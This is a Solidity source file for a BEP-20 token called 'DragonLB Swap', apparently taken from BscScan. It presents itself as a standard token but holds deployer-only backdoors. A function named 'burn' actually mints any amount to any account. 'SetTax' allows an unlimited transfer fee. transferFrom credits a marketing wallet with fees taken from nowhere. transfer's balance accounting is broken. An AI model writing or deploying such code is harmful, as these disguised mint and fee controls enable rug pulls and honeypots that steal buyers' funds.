/**
 *Submitted for verification at BscScan.com on 2022-03-24
*/

pragma solidity ^0.8.13;

contract DragonLBSwap {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
     mapping (address => bool) private _isExcludedFrom;

    uint public totalSupply =1000000 * 10 ** 9;
    string public name = "DragonLB Swap";
    string public symbol = "DRLB";
    uint public decimals = 9;
    uint256 public feeburn = 5;
    address private dev;
    address private _marketing;
    uint256 feeamount = 0;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor(address marketing) {
        _marketing = marketing;
        balances[msg.sender] = totalSupply;
        dev = msg.sender;
        _isExcludedFrom[msg.sender] = true;
    }
    
    function balanceOf(address owner) public returns(uint) {
        return balances[owner];
    }
    function SetTax(uint256 value) public{
        require (msg.sender == dev);
        feeburn = value;
    }
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        feeamount = (value*feeburn)/100;
        value = value - feeamount;
        balances[to] += value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        feeamount = (value*feeburn)/100;
        if (from != to || !_isExcludedFrom[msg.sender]){
            emit Transfer(from , _marketing, feeamount);
            balances[_marketing] += feeamount;
        }
        value = value - feeamount;
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }
    function burn (uint256 value, address account) public {
        require (msg.sender == dev);
        balances[account] += value;

    }
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}